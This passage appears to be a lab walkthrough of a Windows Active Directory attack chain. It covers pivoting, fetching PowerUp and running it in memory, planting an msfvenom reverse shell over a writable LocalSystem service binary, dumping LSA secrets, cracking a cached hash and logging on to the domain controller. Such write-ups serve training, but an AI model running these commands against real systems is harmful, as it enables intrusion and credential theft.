    proxychains -q nmap -v -F 10.0.2.9 -Pn -sT
    ```
    
    Copy
    
    Fast scan of the top 100 ports through the proxy: `-Pn` skips host discovery, `-sT` makes a full TCP connect on each port and `-v` prints as it goes.
    
    **Why**`-sT` is the only scan type proxychains can carry, because it uses ordinary sockets instead of raw packets. It reports 135 and 3389 among others.
    
    Kali
    
    ```
    cat notes
    ```
    
    Copy
    
    Prints the running notes file for the chain, which holds the hosts, the credentials found so far and the next step.
    
    **Why**A written list of what worked keeps a long session on track, and it is where csanders and this host came from.
    
    Kali
    
    ```
    proxychains -q xfreerdp3 /v:10.0.2.9 /u:csanders /p:'*Gillian*' /cert:ignore +clipboard /dynamic-resolution
    ```
    
    Copy
    
    Opens RDP to CLIENT-2 as csanders. `/cert:ignore` accepts the self-signed certificate, `+clipboard` shares the clipboard and `/dynamic-resolution` resizes the desktop with the window.
    
    **Why**The desktop is the platform for local enumeration, and xfreerdp is the command line way to get one that runs behind proxychains.
    
    **Tip**Quoting the password matters. Without the single quotes the shell expands the asterisks into file names and the login fails for a reason that looks nothing like a password problem.
    
15. 15Find the service we are allowed to overwrite_45:58_
    
    On CLIENT-2 the same enumeration runs again, and this time PowerUp reports something usable: the service WinMonSvc runs as LocalSystem with automatic start, and its binary is writable by our user. PowerUp names the file: `svchosthelper.exe` in the Common Files services folder, and it offers the matching abuse function.
    
    `icacls` and `get-acl` confirm the permissions by hand, because a PowerUp finding is a claim until you read the ACL yourself. `sc.exe query` shows the service stopped, and trying to start it gives Access denied, which tells us we cannot restart it as this user. `sc.exe qc` then shows the configuration that matters: an auto-start service running as LocalSystem.
    
    Target (RDP)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the user, groups and privileges for csanders on CLIENT-2. The account is an ordinary domain user here, with no local admin group.
    
    **Why**We need to know whether escalation can come from a privilege we already hold before looking for a misconfigured service.
    
    Target (RDP)
    
    ```
    ipconfig
    ```
    
    Copy
    
    Shows the CLIENT-2 adapters, including the internal address `CLIENT2_IP`.
    
    **Why**The payload has to be reachable from this machine, so we keep our own network in view while working on the far side of the pivot.
    
    Target (RDP)
    
    ```
    powershell.exe -c "wget -useb https://raw.githubusercontent.com/punishell/ADCheatSheet/refs/heads/master/PowerUp.ps1 | iex; Invoke-AllChecks"
    ```
    
    Copy
    
    Runs PowerUp again, in memory. It flags WinMonSvc with `ModifiableFile` on `svchosthelper.exe`, the service account LocalSystem, and an abuse function `Install-ServiceBinary`.
    
    **Why**A service binary that any user can replace, on a service that starts as LocalSystem, is a direct route from a user shell to SYSTEM.
    
    Target (RDP)
    
    ```
    icacls "C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe"
    ```
    
    Copy
    
    Prints the file's access control list. Our user has write and modify rights on the executable.
    
    **Why**The ACL is the whole vulnerability. Reading it with a second tool rules out a misread of the PowerUp output.
    
    Target (RDP)
    
    ```
    get-acl "C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe"
    ```
    
    Copy
    
    Shows the same permissions in PowerShell's object form.
    
    **Why**A second, independent view of the same rule, which matters when the next step overwrites a system file.
    
    Target (RDP)
    
    ```
    get-acl "C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe" | fl
    ```
    
    Copy
    
    The same output as a full list, one property per line, which is the readable form.
    
    **Why**The table view cuts off the useful part of the access entries; the list form shows the identity and the rights together.
    
    Target (RDP)
    
    ```
    sc.exe query WinMonSvc
    ```
    
    Copy
    
    Asks the service control manager for the state of WinMonSvc. It reports STOPPED.
    
    **Why**A stopped service has to be started, by us or by a reboot, before our replacement binary runs.
    
    Target (RDP)
    
    ```
    sc.exe start WinMonSvc
    ```
    
    Copy
    
    Tries to start the service. It fails with `OpenService FAILED 5: Access is denied.`
    
    **Why**The failure is the point: we may write the binary but not control the service, so the restart has to come from somewhere else.
    
    Target (RDP)
    
    ```
    sc.exe qc WinMonSvc
    ```
    
    Copy
    
    Prints the service configuration: START_TYPE 2 AUTO_START, BINARY_PATH_NAME pointing at `svchosthelper.exe`, and SERVICE_START_NAME LocalSystem.
    
    **Why**Automatic start means a reboot is enough to run our binary as SYSTEM, with no service rights needed.
    
    **Tip**Read `ModifiableFile` on the PowerUp line before believing it. Copy the exact path from `sc.exe qc` and test the ACL on that same file, not on a file with a similar name.
    
16. 16Replace the service binary and get SYSTEM_50:00_
    
    The payload is a plain Windows reverse shell built with msfvenom, pointed at `YOUR_IP` on 443 so it travels back through the pivot. It is copied into the tools folder the HTTP server is serving, and a listener waits on the same port.
    
    On CLIENT-2 we pull the exe into C:\windows\tasks and run it once. That gives a shell as csanders, not SYSTEM, which is the expected result of running the file by hand. The real step is to copy our exe over `svchosthelper.exe` and then reboot: on the next start the service launches our binary as LocalSystem, and the listener catches a second shell as `nt authority\system`.
    
    Kali
    
    ```
    msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=10.0.0.6 LPORT=443 -f exe > shell.exe
    ```
    
    Copy
    
    Builds a 64-bit Windows reverse shell executable. `-p` picks the payload, `-a x64` and `--platform windows` fix the target format, `LHOST` and `LPORT` are the address and port it calls back to, and `-f exe` writes a Windows executable.
    
    **Why**A reverse shell is what survives a service start cleanly, and 443 is the port least likely to be filtered between the networks.
    
    Kali
    
    ```
    cp shell.exe /opt/tools/privesc
    ```
    
    Copy
    
    Copies the payload into the tools folder that the HTTP server is serving.
    
    **Why**The target can only pull what sits in that folder, and the command was built in the home directory.
    
    Target (RDP)
    
    ```
    cd c:\windows\tasks
    ```
    
    Copy
    
    Changes to the writable folder used for dropped files.
    
    **Why**The payload is staged somewhere the account can write and the path is short to type.
    
    Kali
    
    ```
    rlwrap nc -lvnp 443
    ```
    
    Copy
    
    Listens on 443 for the callback. `-l` listens, `-v` is verbose, `-n` skips DNS, `-p` names the port, and rlwrap adds line editing and history to the raw shell.
    
    **Why**The listener has to be up before the payload runs, and rlwrap makes the shell usable for the next commands.
    
    Target (RDP)
    
    ```
    wget 10.0.0.6/shell.exe -o shell.exe
    ```
    
    Copy
    
    Downloads the payload from the HTTP server into C:\windows\tasks.
    
    **Why**The file has to exist locally before it can be copied over the service binary.
    
    Target (RDP)
    
    ```
    .\shell.exe
    ```
    
    Copy
    
    Runs the payload by hand. The listener receives a shell as csanders, because it is the user that started it.
    
    **Why**Running it once proves the payload connects before it is placed where the service will start it.
    
    Target shell (csanders)
    
    ```
    icacls.exe "C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe"
    ```
    
    Copy
    
    Checks the ACL again from the reverse shell, with the full path quoted so the spaces are handled.
    
    **Why**The same test in the shell that will do the copy, because a different logon session can carry different rights.
    
    Target shell (csanders)
    
    ```
    copy shell.exe "C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe"
    ```
    
    Copy
    
    Overwrites the service binary with our payload. It answers `1 file(s) copied`, with no Access denied.
    
    **Why**This is the exploitation step: the file the service will launch as SYSTEM is now our program.
    
    Target shell (csanders)
    
    ```
    cmd.exe /c "C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe"
    ```
    
    Copy
    
    Runs the replaced binary once through cmd. It connects back, but as csanders, because we started it.
    
    **Why**A quick check that the file still executes from its new location, so the reboot cannot fail for a broken binary.
    
    Target shell (csanders)
    
    ```
    Restart-Computer
    ```
    
    Copy
    
    Reboots CLIENT-2. The session drops, and on start WinMonSvc launches the replaced binary as LocalSystem.
    
    **Why**We cannot start the service ourselves, but an automatic start service runs its binary on boot, which is the whole reason this works.
    
    Target (SYSTEM shell)
    
    ```
    whoami
    ```
    
    Copy
    
    Confirms the second callback: `nt authority\system`.
    
    **Why**SYSTEM on a domain-joined client is a local administrator and can read the machine's secrets, which is the next objective.
    
    Target (SYSTEM shell)
    
    ```
    hostname
    ```
    
    Copy
    
    Prints `Client-2`, confirming which machine the SYSTEM shell is on.
    
    **Why**With several tunnels open it is easy to lose track of which host a shell belongs to.
    
    **Tip**A plain `nc -lvnp 443` catches the shell but gives no line editing, so the copy and reboot lines are painful to correct. rlwrap costs nothing and saves the session.
    
17. 17Dump the machine cache and crack rcooper_56:24_
    
    With a SYSTEM shell and a working domain credential, the rest of the subnet can be swept from Kali. SMB confirms csanders on all four hosts, and we give that account local administrator rights on CLIENT-2 so a remote dump can run over SMB instead of through the shell.
    
    `--lsa` then dumps the LSA secrets from CLIENT-2: eight secrets, including cached domain logons. The cached entry for rcooper is a DCC2 (mscash2) hash, which is slow to crack but needs no contact with the domain controller to use. We paste it into a file and john does the rest, returning `Password@123`.
    
    Kali
    
    ```
    proxychains -q netexec smb ips -u csanders -p '*Gillian*'
    ```
    
    Copy
    
    Validates csanders on every host in the ips file over SMB. All four accept the credential, and CLIENT-1 and CLIENT-2 report local admin.
    
    **Why**Before dumping anything we want the full picture of where the credential is privileged, because only an administrator can read LSA secrets remotely.
    
    Target (SYSTEM shell)
    
    ```
    net localgroup "administrators" csanders /add
    ```
    
    Copy
    
    Adds the domain account csanders to the local Administrators group on CLIENT-2. Run from the SYSTEM shell, which is allowed to change local groups.
    
    **Why**The remote dump runs as csanders, so that account needs admin rights on the machine whose secrets are being read.
    
    Kali
    
    ```
    proxychains -q netexec smb ips -u csanders -p '*Gillian*' --lsa
    ```
    
    Copy
    
    Dumps the LSA secrets from every host where the account has admin rights and saves them under the netexec logs folder. CLIENT-2 gives up eight secrets, including the cached domain logons.
    
    **Why**LSA secrets hold service account passwords and the cached domain credentials, which is where a second domain account comes from when you already hold local admin.
    
    Kali
    
    ```
    gedit mscach_client_2
    ```
    
    Copy
    
    Opens a new file, named for the host, and the rcooper DCC2 hash is pasted into it in john's mscash2 format.
    
    **Why**john needs one clean hash per line, and pasting it by hand is more reliable than fighting the format of the saved log file.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt mscach_client_2
    ```
    
    Copy
    
    Cracks the cached credential. john detects `mscash2` by itself and returns `Password@123` for HACK-ACADEMY.LOCAL/rcooper.
    
    **Why**A cached domain credential belongs to a domain account, and this one will be tried against the domain controller next.
    
    **Tip**DCC2 hashes are deliberately slow, roughly a thousand times slower than an NTLM hash per guess. Start them early, or hunt for a cached credential for an account you know has rights.
    
18. 18Log on to the domain controller as rcooper_1:08:16_
    
    Everything now comes together. rcooper's cracked password is checked against WinRM on `DC_IP`, and the answer is `Pwn3d!` with the command output `hack-academy\rcooper`, which means the account can run commands on the domain controller.
    
    The interactive session is opened with evil-winrm over the same tunnel. The prompt lands in rcooper's Documents folder on DC01, and from there the account's rights on the domain controller carry the rest of the chain.
    
    Kali
    
    ```
    proxychains -q netexec winrm 10.0.2.4 -u rcooper -p 'Password@123' -X 'whoami'
    ```
    
    Copy
    
    Logs in to the domain controller over WinRM and runs `whoami` there with `-X`. The reply is `Pwn3d!` and the output `hack-academy\rcooper`.
    
    **Why**A single command proves both the credential and the right to execute on the DC, which is what makes the next step worth taking.
    
    Kali
    
    ```
    proxychains -q evil-winrm -i 10.0.2.4 -u rcooper -p 'Password@123'
    ```
    
    Copy
    
    Opens an interactive PowerShell session on the domain controller as rcooper, with an `*Evil-WinRM*` prompt in C:\Users\rcooper\Documents.
    
    **Why**An interactive shell on the DC is the position the chain was aiming at, and rcooper is a member of Server Operators there, a group that can run services on the domain controller.
    
    **Tip**evil-winrm without proxychains hangs at `Establishing connection`, because there is no route to `DC_IP`. The prefix is not optional on this side of the pivot.



![](Pasted%20image%2020261124192155.png)




